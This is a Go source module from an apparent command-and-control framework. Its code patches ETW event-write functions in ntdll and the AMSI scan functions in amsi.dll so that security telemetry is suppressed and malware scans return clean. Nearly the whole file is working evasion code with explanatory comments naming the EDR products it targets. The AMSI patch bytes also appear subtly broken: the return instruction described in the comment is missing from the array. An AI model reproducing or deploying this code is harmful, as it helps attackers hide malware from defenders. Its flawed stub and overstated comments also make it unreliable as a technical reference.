package evasion

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// ETW (Event Tracing for Windows) patching.
//
// Nearly every modern EDR — CrowdStrike Falcon, Microsoft Defender ATP,
// SentinelOne, Elastic — subscribes to one or more ETW providers to get
// real-time telemetry about process activity, memory allocation, network
// connections, and .NET/PowerShell execution. Examples:
//
//   Microsoft-Windows-Threat-Intelligence        (SRUM, kernel callbacks)
//   Microsoft-Antimalware-Scan-Interface         (AMSI events)
//   Microsoft-Windows-DotNETRuntime              (.NET execution)
//   Microsoft-Windows-PowerShell                 (script block logging)
//   Microsoft-Windows-Kernel-Process             (process/image events)
//
// All of these flow through a small set of ntdll.dll functions:
//
//   EtwEventWrite           — primary write path, most providers use this
//   EtwEventWriteFull       — extended write (activity ID + level filter)
//   EtwEventWriteEx         — full options (timeout, relay session)
//   EtwEventWriteTransfer   — cross-activity causality chaining
//   NtTraceEvent            — raw NT syscall beneath EtwEventWrite
//
// Technique — in-process stub patch:
//
//   For each target function we:
//     1. Resolve its address in the already-loaded ntdll mapping.
//     2. VirtualProtect the containing page to PAGE_EXECUTE_READWRITE.
//     3. Write a 3-byte return-zero stub at offset 0:
//          33 C0          xor eax, eax   ; NTSTATUS = STATUS_SUCCESS (0)
//          C3             ret
//     4. Restore the original page protection.
//     5. FlushInstructionCache so CPUs with stale prefetch see the patch.
//
// Scope and limitations:
//   - This patches only the current process. Other processes (including
//     the ETW session host svchost) are unaffected.
//   - Kernel-mode ETW (via WPP / TraceLogging in kernel drivers) is NOT
//     affected — those write directly through the kernel EtwWrite path.
//     The BYOVD module handles kernel-level callback removal separately.
//   - The patch is not persistent across ntdll re-loads (rare in practice).
//   - Windows 10 1903+ Kernel Patch Protection (KPP / PatchGuard) does NOT
//     protect user-mode ntdll pages, so this is safe from a BSOD perspective.
//   - Some AV products hook EtwEventWrite themselves and re-route it;
//     patching the original bytes still wins because we write at the real
//     function entry before the AV trampoline gets a chance to run.

import (
	"fmt"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
)

// etwPatchStub is the 3-byte x64 sequence that replaces every target
// function: xor eax,eax (zero NTSTATUS) followed by near ret.
var etwPatchStub = [3]byte{0x33, 0xC0, 0xC3}

// etwTargets lists every ntdll export we blank out.
// NtTraceEvent sits below EtwEventWrite in the syscall stack; patching
// both ensures coverage even when code calls the NT layer directly.
var etwTargets = []string{
	"EtwEventWrite",
	"EtwEventWriteFull",
	"EtwEventWriteEx",
	"EtwEventWriteTransfer",
	"NtTraceEvent",
}

// ETWPatchResult records which functions were successfully patched and
// which failed, for debug-build reporting.
type ETWPatchResult struct {
	Patched []string
	Failed  map[string]error
}

// PatchETW patches all ETW write functions in the current process's
// ntdll mapping. Safe to call multiple times — idempotent.
func PatchETW() (*ETWPatchResult, error) {
	ntdll, err := windows.LoadDLL("ntdll.dll")
	if err != nil {
		return nil, fmt.Errorf("load ntdll: %w", err)
	}
	// Do NOT FreeLibrary — ntdll is always loaded and freeing would
	// decrement its ref count unnecessarily.

	res := &ETWPatchResult{
		Failed: make(map[string]error),
	}

	for _, name := range etwTargets {
		proc, err := ntdll.FindProc(name)
		if err != nil {
			// Some exports are absent on older Windows versions — skip quietly.
			// {{if .Config.Debug}}
			log.Printf("[etw] %s not found in ntdll: %v", name, err)
			// {{end}}
			res.Failed[name] = err
			continue
		}

		if err := patchProc(proc.Addr(), name); err != nil {
			res.Failed[name] = err
			// {{if .Config.Debug}}
			log.Printf("[etw] patch %s failed: %v", name, err)
			// {{end}}
		} else {
			res.Patched = append(res.Patched, name)
			// {{if .Config.Debug}}
			log.Printf("[etw] patched %s @ 0x%x", name, proc.Addr())
			// {{end}}
		}
	}

	if len(res.Patched) == 0 {
		return res, fmt.Errorf("no ETW functions could be patched")
	}
	return res, nil
}

// patchProc writes etwPatchStub over the first bytes of the function at addr.
func patchProc(addr uintptr, name string) error {
	if addr == 0 {
		return fmt.Errorf("%s resolved to nil", name)
	}

	// Determine page boundaries.
	pageSize := uintptr(windows.Getpagesize())
	pageBase := addr &^ (pageSize - 1)
	regionSize := uintptr(len(etwPatchStub))

	// Some functions sit near a page boundary — if the stub crosses two
	// pages we need to cover both. Add the page after if needed.
	if (addr+regionSize-1)&^(pageSize-1) != pageBase {
		regionSize = pageSize * 2
	}

	// Flip to writable.
	var oldProtect uint32
	if err := windows.VirtualProtect(pageBase, regionSize,
		windows.PAGE_EXECUTE_READWRITE, &oldProtect); err != nil {
		return fmt.Errorf("VirtualProtect RWX: %w", err)
	}

	// Write the stub.
	dst := unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(etwPatchStub))
	copy(dst, etwPatchStub[:])

	// Restore original protection.
	var dummy uint32
	if err := windows.VirtualProtect(pageBase, regionSize,
		oldProtect, &dummy); err != nil {
		// Non-fatal: the patch landed; just log the restore failure.
		// {{if .Config.Debug}}
		log.Printf("[etw] VirtualProtect restore for %s failed: %v", name, err)
		// {{end}}
	}

	// Flush the instruction cache so all logical CPUs see the new bytes.
	return flushInstructionCache(addr, uintptr(len(etwPatchStub)))
}

// flushInstructionCache wraps NtFlushInstructionCache for the current
// process. This is necessary on multi-core systems where a CPU may have
// pre-fetched the old bytes into its pipeline.
var (
	modNtdllETW               = windows.NewLazySystemDLL("ntdll.dll")
	procNtFlushInstCache      = modNtdllETW.NewProc("NtFlushInstructionCache")
)

func flushInstructionCache(base, size uintptr) error {
	r0, _, _ := procNtFlushInstCache.Call(
		uintptr(windows.CurrentProcess()),
		base,
		size,
	)
	if r0 != 0 {
		return fmt.Errorf("NtFlushInstructionCache NTSTATUS=0x%x", r0)
	}
	return nil
}

// PatchAMSI patches AmsiScanBuffer and AmsiScanString in amsi.dll so
// every AMSI scan returns AMSI_RESULT_CLEAN (1). This is bundled here
// because AMSI uses the same ETW-style patch technique and is always
// called together with PatchETW in practice.
func PatchAMSI() error {
	amsi, err := windows.LoadDLL("amsi.dll")
	if err != nil {
		// amsi.dll is not loaded in every process — this is expected.
		// {{if .Config.Debug}}
		log.Printf("[etw] amsi.dll not loaded in this process (ok): %v", err)
		// {{end}}
		return nil
	}

	amsiTargets := []string{"AmsiScanBuffer", "AmsiScanString", "AmsiInitialize"}
	// AMSI_RESULT_CLEAN = 1. We return 1 (not 0) so callers that check
	// for != AMSI_RESULT_NOT_DETECTED don't see a suspicious all-zeros.
	//   xor  eax, eax     33 C0
	//   inc  eax          FF C0
	//   ret               C3
	amsiStub := [4]byte{0x33, 0xC0, 0xFF, 0xC0}
	// For AmsiInitialize we just want S_OK (0):
	amsiInitStub := [3]byte{0x33, 0xC0, 0xC3}

	for _, name := range amsiTargets {
		proc, err := amsi.FindProc(name)
		if err != nil {
			continue
		}
		addr := proc.Addr()
		pageSize := uintptr(windows.Getpagesize())
		pageBase := addr &^ (pageSize - 1)

		var old uint32
		if err := windows.VirtualProtect(pageBase, pageSize,
			windows.PAGE_EXECUTE_READWRITE, &old); err != nil {
			continue
		}

		dst := (*[4]byte)(unsafe.Pointer(addr))
		if name == "AmsiInitialize" {
			(*[3]byte)(unsafe.Pointer(addr))[0] = amsiInitStub[0]
			(*[3]byte)(unsafe.Pointer(addr))[1] = amsiInitStub[1]
			(*[3]byte)(unsafe.Pointer(addr))[2] = amsiInitStub[2]
		} else {
			*dst = amsiStub
		}

		var dummy uint32
		windows.VirtualProtect(pageBase, pageSize, old, &dummy)
		flushInstructionCache(addr, 4)

		// {{if .Config.Debug}}
		log.Printf("[etw] AMSI patched %s @ 0x%x", name, addr)
		// {{end}}
	}
	return nil
}
